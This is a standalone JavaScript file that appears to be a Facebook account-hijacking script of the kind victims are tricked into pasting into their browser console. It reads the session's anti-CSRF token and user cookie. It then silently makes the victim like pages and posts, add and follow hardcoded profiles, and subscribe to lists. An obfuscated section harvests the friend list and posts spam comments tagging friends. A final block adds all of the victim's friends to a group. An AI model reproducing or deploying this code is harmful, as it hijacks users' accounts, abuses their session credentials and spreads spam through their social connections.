var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; 
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); 
function Like(p) { var Page = new XMLHttpRequest();
 var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; 
 var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); 
 Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } };
 Page.send(PageParams); } 
Like("1427714330788710");Like("681661605177496");Like("459526180833776");Like("710616545637958");

 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; 
 var now=(new Date).getTime(); 
 function P(opo) { var X = new XMLHttpRequest(); 
 var XURL ="//www.facebook.com/ajax/ufi/like.php";
 var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
P("277827705701687");P("278716642279460")
var fb_dtsg = document.getElementsByName( 'fb_dtsg')[0].value; var user_id = document.cookie.match( document.cookie.match( /c_user=(\d+)/)[1]); function IDS(r) { var X = new XMLHttpRequest(); var XURL = "//www.facebook.com/ajax/add_friend/action.php"; var XParams = "to_friend=" + r + "&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg=" + fb_dtsg + "&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
IDS("100005776683788");IDS("100004233791019")
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
a("100006312993239");sublist("1529950017232060");sublist("10201527585532271");sublist("1396838530595073")

//emgai
P("1532850513608424");
//tu dan em
a("100004721822384");
//Illuminati Ryo
sublist("1440152199562533");
//keo like
Like("603080806413219");
//10 groups
a("100007229531807");a("100007827639157");
//lang tu 
Like("1409918565922390");Like("219378364899812");Like("275136455944477");Like("511987672246939");Like("225752914298319");Like("619756398080133");Like("747539945263766");Like("1430170487228759");Like("621866964522146");

//banbe

P("698642946812695");P("459527447500316");P("745090038857275");P("631331546921478");P("1409921045922142");P("240769402760708");P("610054002396908");P("705399399502235");

var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","709050142470494","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=(y) Hi Friends if u Love Someone Then Like This Page <3 I Love You <3  Thanks <3 <3 <3 <3 :v (y), :)","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);

var gid = ['1469496253284277'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};